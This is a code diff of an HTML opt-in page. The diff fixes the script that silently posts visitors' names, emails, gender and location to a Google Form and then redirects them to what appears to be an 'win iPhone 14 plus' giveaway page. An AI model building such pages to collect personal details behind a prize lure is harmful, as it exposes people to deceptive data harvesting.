@@ -42,21 +42,29 @@
     </style>
     <script>
         function handleFormSubmit(event) {
-            event.preventDefault(); // Prevent default form submission
-            
+            event.preventDefault(); // Prevent the default form submission
+
             // Perform the actual form submission by creating a new form element
             const form = document.createElement('form');
-            form.action = "https://docs.google.com/forms/d/e/1FAIpQLSdVwup9Zy2PVfjHm7C1HTA_uHs6jxbByM5_KiduOXDEW7fR1w/viewform?usp=sf_link";
+            form.action = "https://docs.google.com/forms/d/e/1FAIpQLSdVwup9Zy2PVfjHm7C1HTA_uHs6jxbByM5_KiduOXDEW7fR1w/formResponse"; // Use formResponse, not viewform
             form.method = "POST";
             form.target = "_blank";
 
-            // Append form data
-            const fields = ['entry.111111111', 'entry.222222222', 'entry.333333333', 'entry.444444444', 'entry.555555555', 'entry.666666666'];
+            // Append form data using correct entry names
+            const fields = [
+                'entry.493883867', // First Name
+                'entry.177051161', // Last Name
+                'entry.711119156', // Email
+                'entry.453706432', // Gender
+                'entry.1226615673', // City
+                'entry.458008119' // Country
+            ];
+            
             fields.forEach(field => {
                 const input = document.createElement('input');
                 input.type = 'hidden';
                 input.name = field;
-                input.value = document.getElementsByName(field)[0].value;
+                input.value = document.getElementsByName(field)[0].value || ""; // Get the input value
                 form.appendChild(input);
             });
 
@@ -64,8 +72,10 @@
             document.body.appendChild(form);
             form.submit();
 
-            // Redirect to another website
-            window.location.href = "https://rileymarker.com/Winiphone14plusnow"; // Replace with your desired redirect URL
+            // Redirect after a slight delay to ensure form submission completes
+            setTimeout(() => {
+                window.location.href = "https://rileymarker.com/Winiphone14plusnow"; // Replace with your desired redirect URL
+            }, 1000);
         }
     </script>
 </head>
@@ -73,7 +83,6 @@
     <div class="form-container">
         <h3>Enter your real information we can use to contact you</h3>
         <form id="optInForm" onsubmit="handleFormSubmit(event)">
-            <!-- Replace `entry.xxxxxxx` with your Google Form's entry IDs -->
             <input type="text" name="entry.493883867" placeholder="First Name" required><br>
             <input type="text" name="entry.177051161" placeholder="Last Name" required><br>
             <input type="email" name="entry.711119156" placeholder="Email" required><br>
